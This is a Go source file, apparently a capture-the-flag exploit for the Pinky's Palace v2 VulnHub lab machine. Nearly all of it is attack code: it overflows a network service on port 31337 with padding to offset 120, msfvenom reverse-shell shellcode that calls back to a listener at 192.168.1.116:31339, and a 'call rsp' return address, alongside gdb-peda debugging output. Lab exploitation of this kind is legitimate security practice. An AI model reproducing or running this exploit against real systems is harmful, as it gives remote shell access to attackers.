/* 	PPv2_Panel_Exploit.go
	chris.downs[at]reticulipictures.com
	Sat Jun 16 17:35:58 CDT 2018

	https://www.vulnhub.com/entry/pinkys-palace-v2,229/
	SHA1: 30449669776FF319ABB3C0E37D7059F9B37EE3D2
*/
package main

import (
	"strings"
	"strconv"
	"bytes"
	"time"
	"log"
	"net"
	//"fmt"
)

func main() {
	var (
		ip = "192.168.1.119"
		port = 31337
	)
	SocketClient(ip,port)
}

func SocketClient(ip string, port int) {
	addr := strings.Join([]string{ip, strconv.Itoa(port)}, ":")
	conn, err := net.Dial("tcp", addr)

	// msfvenom -a x64 -p linux/x64/shell_reverse_tcp LHOST=192.168.1.116 LPORT=31339 -b 00 -f python 
	buf := "" 
	buf += "\x48\x31\xc9\x48\x81\xe9\xf6\xff\xff\xff\x48\x8d\x05"
	buf += "\xef\xff\xff\xff\x48\xbb\xd8\xba\xf4\xd7\x7d\x4a\x03"
	buf += "\x38\x48\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4"
	buf += "\xb2\x93\xac\x4e\x17\x48\x5c\x52\xd9\xe4\xfb\xd2\x35"
	buf += "\xdd\x4b\x81\xda\xba\x8e\xbc\xbd\xe2\x02\x4c\x89\xf2"
	buf += "\x7d\x31\x17\x5a\x59\x52\xf2\xe2\xfb\xd2\x17\x49\x5d"
	buf += "\x70\x27\x74\x9e\xf6\x25\x45\x06\x4d\x2e\xd0\xcf\x8f"
	buf += "\xe4\x02\xb8\x17\xba\xd3\x9a\xf8\x0e\x22\x03\x6b\x90"
	buf += "\x33\x13\x85\x2a\x02\x8a\xde\xd7\xbf\xf4\xd7\x7d\x4a"
	buf += "\x03\x38"

	// return
	/* gdb-peda$ pattern_offset jAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA
	jAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA found at offset: 120
	gdb-peda$ jmpcall
	0x400728 : call rax
	0x400895 : jmp rax
	0x4008e3 : jmp rax
	0x40092e : call rax
	0x400cfb : call rsp
	0x400d6b : call [rax]
	gdb-peda$ x/i 0x400cfb
   		0x400cfb:	call   rsp
	gdb-peda$ */

	// 0x400cfb @offset 120
	ret := "\xfb\x0c\x40\x00"

	defer conn.Close()

	if err != nil {
		log.Fatalln(err)
	}

	// padding
	var b bytes.Buffer
	var p = 120
	var n = len(buf)
	var c = p - n
	for i := 0; i < c; i++ {
    		b.WriteString("A")
	}

	//fmt.Println(b.String())
	//fmt.Println(p)
	//fmt.Println(n)

	buff := make([]byte, 1024)
	n, _ = conn.Read(buff)
	time.Sleep(1 * time.Second)
	log.Printf("Receive: %s", buff[:n])

	// payload
	conn.Write([]byte(b.String()))
	conn.Write([]byte(buf))
	conn.Write([]byte(ret))
	n, _ = conn.Read(buff)

	log.Printf("Payload: %s", b.String(), buf, ret)
}
